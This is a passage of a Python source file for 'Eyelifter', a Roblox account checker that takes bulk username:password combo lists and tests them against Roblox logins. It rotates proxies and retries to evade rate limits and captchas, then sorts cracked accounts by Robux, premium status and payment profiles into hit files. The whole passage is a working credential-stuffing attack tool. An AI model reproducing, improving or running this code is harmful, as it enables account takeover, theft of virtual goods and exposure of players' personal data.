        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        else:
            if proxy and proxy in _eyelifter_bad:
                proxy = Eyelifter_pick_proxy()
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(username, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash", "message": str(e)[:120]}

        st = result.get("status", "unknown")
        et = result.get("error_type", "")

        if st in ("premium", "hit", "free", "bad", "locked", "2fa"):
            break

        if st == "captcha":
            captcha_hits += 1
            if captcha_hits >= 2:
                break
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(0.5)
            continue

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad(proxy)
            continue

        if et in ("network", "no_csrf", "no_cookie", "no_nonce") or et.startswith("http_"):
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 1))
            continue

        await asyncio.sleep(CONFIG.get("retry_delay", 1))

    return result or {"status": "error", "error_type": "no_result", "message": "no result"}


def Eyelifter_record(combo, result):
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_locked_f
    global _eyelifter_2fa_f, _eyelifter_err_f, _eyelifter_captcha_f
    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
    total = _eyelifter_total
    st = result.get("status", "unknown")

    if st in ("hit", "premium"):
        u = result.get("user", {}) or {}
        line = Eyelifter_fmt_line(combo, u)
        with _eyelifter_lock:
            _eyelifter_stats["hits"] += 1
        print(f"\n[{done}/{total}] {line}\n")
        _safe_write(_eyelifter_hits_f, line + "\n\n")
    elif st == "free":
        u = result.get("user", {}) or {}
        line = Eyelifter_fmt_line(combo, u)
        with _eyelifter_lock:
            _eyelifter_stats["free"] += 1
        print(f"\n[{done}/{total}] {line}\n")
        _safe_write(_eyelifter_free_f, line + "\n\n")
    elif st == "bad":
        with _eyelifter_lock:
            _eyelifter_stats["bad"] += 1
        msg = result.get("message", "invalid credentials")
        _safe_write(_eyelifter_bad_f, f"{combo} | {msg}\n")
    elif st == "2fa":
        with _eyelifter_lock:
            _eyelifter_stats["2fa"] += 1
        line = (f"🔐 2FA {combo} | uid={result.get('uid')} | "
                f"user={result.get('username')} | by {AUTHOR_TAG}")
        print(f"\n[{done}/{total}] {line}\n")
        _safe_write(_eyelifter_2fa_f, line + "\n\n")
    elif st == "locked":
        with _eyelifter_lock:
            _eyelifter_stats["locked"] += 1
        line = f"🔒 LOCKED {combo} | {result.get('message')} | by {AUTHOR_TAG}"
        print(f"\n[{done}/{total}] {line}\n")
        _safe_write(_eyelifter_locked_f, line + "\n\n")
    elif st == "captcha":
        with _eyelifter_lock:
            _eyelifter_stats["captcha"] += 1
        et = result.get("error_type", "captcha")
        cid = result.get("challenge_id", "")
        line = f"🧩 CHALLENGE {combo} | {et} | id={cid[:20]}"
        _safe_write(_eyelifter_captcha_f, line + "\n")
    else:
        with _eyelifter_lock:
            _eyelifter_stats["errors"] += 1
        et = result.get("error_type", "")
        msg = result.get("message", "unknown")
        _safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    sem = asyncio.Semaphore(CONFIG["threads"])
    lock = asyncio.Lock()

    async def one(combo):
        if _eyelifter_stop.is_set():
            return
        async with sem:
            if _eyelifter_stop.is_set():
                return
            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}
            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)
            d = CONFIG.get("combo_delay", 0)
            if d > 0:
                await asyncio.sleep(d)

    tasks = [asyncio.create_task(one(c)) for c in combos]
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        raise


def Eyelifter_single_check(proxies):
    global _eyelifter_pool, _eyelifter_bad
    section("SINGLE CHECK")
    combo = input(f"{_c('96', '[*] Enter username:password: ')}").strip()
    if ":" not in combo:
        L("❌", "ERROR", "INPUT", "invalid format")
        input(f"{_c('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        L("🌐", "INFO", "PROXY", "using proxy")
    else:
        L("🌐", "INFO", "PROXY", "direct connection")

    L("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "premium", "free"):
        u = result.get("user", {}) or {}
        if isinstance(u.get("robux"), int) and u["robux"] > 0:
            verdict = "✅ HIT"
        elif isinstance(u.get("bundles"), int) and u["bundles"] > 0:
            verdict = "✅ HIT (bundles)"
        elif u.get("premium"):
            verdict = "💎 PREMIUM"
        else:
            verdict = "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Username", u.get("username", "-")),
            ("Display", u.get("display", "-")),
            ("UID", u.get("uid", "-")),
            ("Created", u.get("created", "-")),
            ("Verified", "Yes" if u.get("verified") else "No"),
            ("Banned", "Yes" if u.get("banned") else "No"),
            ("Description", (u.get("description", "") or "-")[:60]),
            ("Robux", u.get("robux", "-")),
            ("Premium", "Yes" if u.get("premium") else "No"),
            ("Premium Expiry", u.get("premium_expiry", "-")),
            ("Country", u.get("country", "-")),
            ("Birthday", u.get("birthday", "-")),
            ("Age Group", u.get("age_group", "-")),
            ("Credit", u.get("credit", "-")),
            ("Player Badges", u.get("badges", "-")),
            ("Roblox Badges", u.get("rbx_badges", "-")[:60]),
            ("Games", u.get("games", "-")),
            ("Games (sample)", u.get("games_sample", "-")[:60]),
            ("Hats", u.get("hats", "-")),
            ("Bundles", u.get("bundles", "-")),
            ("Bundles (sample)", (u.get("bundles_sample", "-") or "-")[:60]),
            ("Payment Profiles", u.get("payments", "-")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        print()
        summary_box(rows)
    else:
        st = result.get("status", "unknown")
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        L("❌", "ERROR", "RESULT", f"{st} [{et}] – {msg}")

    input(f"{_c('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f
    global _eyelifter_locked_f, _eyelifter_2fa_f, _eyelifter_err_f, _eyelifter_captcha_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad
    Eyelifter_reset_stats()
    section("BULK CHECK")

    path = input(f"{_c('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        L("❌", "ERROR", "FILE", "file not found")
        input(f"{_c('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = sorted(Eyelifter_extract_combos(content))
    if not combos:
        L("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{_c('93', '[*] Enter to continue...')}")
        return

    L("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "roblox_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "roblox_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "roblox_bad.txt"), "w", encoding="utf-8")
    _eyelifter_locked_f = open(os.path.join(_eyelifter_folder, "roblox_locked.txt"), "w", encoding="utf-8")
    _eyelifter_2fa_f = open(os.path.join(_eyelifter_folder, "roblox_2fa.txt"), "w", encoding="utf-8")
    _eyelifter_captcha_f = open(os.path.join(_eyelifter_folder, "roblox_challenges.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "roblox_errors.txt"), "w", encoding="utf-8")

    header = (f"# Roblox Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f,
               _eyelifter_locked_f, _eyelifter_2fa_f, _eyelifter_captcha_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    L("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    L("⚙️", "INFO", "CONFIG",
      f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
      f"retries:{CONFIG['retries']} delay:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
    else:
        working = []
    _eyelifter_pool = working
    _eyelifter_bad = set()

    _eyelifter_stop.clear()
    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        L("🛑", "WARN", "STOP", "stopping...")

    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f,
               _eyelifter_locked_f, _eyelifter_2fa_f, _eyelifter_captcha_f, _eyelifter_err_f):
        try:
            fh.close()
        except Exception:
            pass

    for base, key in (
        ("roblox_hits.txt", "hits"), ("roblox_free.txt", "free"),
        ("roblox_bad.txt", "bad"), ("roblox_locked.txt", "locked"),
        ("roblox_2fa.txt", "2fa"), ("roblox_challenges.txt", "captcha"),
        ("roblox_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    L("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    divider()
    el = time.time() - _eyelifter_start
    summary_box([
        ("Total", _eyelifter_total),
        ("Hits (robux / premium / bundles)", _eyelifter_stats["hits"]),
        ("Free accounts", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Locked", _eyelifter_stats["locked"]),
        ("2FA required", _eyelifter_stats["2fa"]),
        ("Challenges (PoW/captcha)", _eyelifter_stats["captcha"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{_c('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    section("SETTINGS")
    print(_c("96", "Current Settings:"))
    print(f"  Threads: {CONFIG['threads']} (1-100)")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Retry Delay: {CONFIG['retry_delay']}s")
    print(f"  Combo Delay: {CONFIG['combo_delay']}s")
    print(f"  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  Max Rate Limit Retries: {CONFIG['max_rate_limit_retries']}")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print(f"  Skip Proxy Test: {CONFIG['skip_proxy_test']}")
    print(f"  Debug: {CONFIG['debug']}")
    print()
    print(_c("93", "[1] Change Threads (1-100)"))
    print(_c("93", "[2] Change Timeout"))
    print(_c("93", "[3] Change Retries"))
    print(_c("93", "[4] Change Retry Delay"))
    print(_c("93", "[5] Change Combo Delay"))
    print(_c("93", "[6] Toggle Debug"))
    print(_c("93", "[7] Toggle Skip Proxy Test"))
    print(_c("93", "[8] Back"))

    ch = input(f"{_c('96', '[*] Select: ')}").strip()
    changed = False

    if ch == "1":
        try:
            v = int(input("Threads (1-100): "))
            CONFIG["threads"] = max(1, min(100, v))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
            L("✅", "INFO", "CONFIG", f"threads={CONFIG['threads']}")
        except Exception:
            L("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "2":
        try:
            v = int(input("Timeout (5-120): "))
            CONFIG["timeout"] = max(5, min(120, v))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
            L("✅", "INFO", "CONFIG", f"timeout={CONFIG['timeout']}")
        except Exception:
            L("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "3":
        try:
            v = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, v))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
            L("✅", "INFO", "CONFIG", f"retries={CONFIG['retries']}")
        except Exception:
            L("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "4":
        try:
            v = float(input("Retry delay (seconds): "))
            CONFIG["retry_delay"] = max(0.0, v)
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
            L("✅", "INFO", "CONFIG", f"retry_delay={CONFIG['retry_delay']}")
        except Exception:
            L("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "5":
        try:
            v = float(input("Combo delay (seconds): "))
            CONFIG["combo_delay"] = max(0.0, v)
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
            L("✅", "INFO", "CONFIG", f"combo_delay={CONFIG['combo_delay']}")
        except Exception:
            L("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "6":
        CONFIG["debug"] = not CONFIG["debug"]
        _loader.settings["debug"] = CONFIG["debug"]
        DEBUG = CONFIG["debug"]
        changed = True
        L("✅", "INFO", "CONFIG", f"debug={CONFIG['debug']}")
    elif ch == "7":
        CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
        _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
        changed = True
        L("✅", "INFO", "CONFIG", f"skip_proxy_test={CONFIG['skip_proxy_test']}")

    if changed:
        RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
        MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
        try:
            _loader.Eyelifter_save()
            L("💾", "INFO", "CONFIG", "saved to disk")
        except Exception as e:
            L("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    _v("main")

    def _delayed_open():
        time.sleep(0.4)
        _open_url("https://t.me/darkhuchannel")

    pass  # disabled in bot
    banner(TOOL_NAME, "Roblox Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        _v("menu")
        section("MAIN MENU")
        if proxies:
            L("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            L("⚠️", "WARN", "PROXY", "no proxies - direct connection")

        print(_c("96", "[1] Single check"))
        print(_c("96", "[2] Bulk check from file"))
        print(_c("96", "[3] Settings"))
        print(_c("96", "[4] Exit"))

        choice = input(f"{_c('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            L("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)